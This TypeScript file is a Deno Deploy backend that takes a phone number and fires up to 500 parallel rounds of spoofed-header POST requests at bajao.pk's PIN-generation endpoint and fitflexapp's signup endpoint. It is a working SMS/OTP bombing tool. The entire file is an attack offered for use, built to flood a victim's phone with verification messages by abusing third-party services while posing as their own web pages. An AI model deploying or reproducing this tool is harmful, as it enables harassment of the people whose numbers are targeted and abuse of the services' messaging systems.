// main.ts — Deno Deploy backend
// Deploy on: https://dash.deno.com

const BAJAO_URL = 'https://bajao.pk/api/v2/login/generatePinV2?siteid&selOperator=2';
const FITFLEX_URL = 'https://prod.fitflexapp.com/api/users/signupV1';

const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36';

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Token',
};

function toIntl(num: string): string {
  let s = String(num).replace(/\D/g, '');
  if (s.startsWith('0')) s = s.slice(1);
  if (!s.startsWith('92')) s = '92' + s;
  return s;
}

function log(tag: string, msg: string) {
  console.log(`[${new Date().toISOString()}] [${tag}] ${msg}`);
}

async function fireBajao(uuid: string, idx: number): Promise<string> {
  try {
    const body = new URLSearchParams();
    body.append('uuid', uuid);
    const res = await fetch(BAJAO_URL, {
      method: 'POST',
      headers: {
        'User-Agent': UA,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://bajao.pk',
        'Referer': 'https://bajao.pk/create',
      },
      body: body.toString(),
    });
    log(`BAJAO #${idx}`, `uuid=${uuid} → HTTP ${res.status}`);
    return String(res.status);
  } catch (e) {
    log(`BAJAO #${idx}`, `ERR: ${e}`);
    return '000';
  }
}

async function fireFitflex(msisdn: string, idx: number): Promise<string> {
  try {
    const res = await fetch(FITFLEX_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Origin': 'https://fitflexapp.com',
        'Referer': 'https://fitflexapp.com/',
        'User-Agent': UA,
      },
      body: JSON.stringify({
        msisdn: msisdn,
        type: 'msisdn',
        device_name: 'Netscape',
        app_version: '1.0',
        user_platform: UA,
      }),
    });
    log(`FITFLEX #${idx}`, `msisdn=${msisdn} → HTTP ${res.status}`);
    return String(res.status);
  } catch (e) {
    log(`FITFLEX #${idx}`, `ERR: ${e}`);
    return '000';
  }
}

Deno.serve(async (req: Request) => {
  const url = new URL(req.url);

  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: CORS });
  }

  if (url.pathname === '/run') {
    const num = (url.searchParams.get('num') || '').trim();
    const countStr = url.searchParams.get('count') || '50';
    let count = parseInt(countStr, 10);
    if (!Number.isFinite(count) || count < 1) count = 50;
    if (count > 500) count = 500;

    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no number' }), {
        status: 400,
        headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }

    const uuid = num;
    const msisdn = toIntl(num);

    log('API', `Received num=${num} count=${count}`);

    // 🔥 Fire ALL requests at once (Promise.all — 100% parallel)
    const tasks: Promise<string>[] = [];
    for (let i = 1; i <= count; i++) {
      tasks.push(fireBajao(uuid, i));
      tasks.push(fireFitflex(msisdn, i));
    }

    const results = await Promise.all(tasks);
    const ok = results.filter(c => c !== '000' && c !== '0').length;
    const fail = results.length - ok;

    log('BURST', `DONE — OK: ${ok}, FAIL: ${fail}, TOTAL: ${results.length}`);

    return new Response(JSON.stringify({
      ok: true,
      fired: results.length,
      success: ok,
      failed: fail,
      uuid: uuid,
      msisdn: msisdn,
      count: count,
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json', ...CORS },
    });
  }

  return new Response('Not Found', { status: 404, headers: CORS });
});
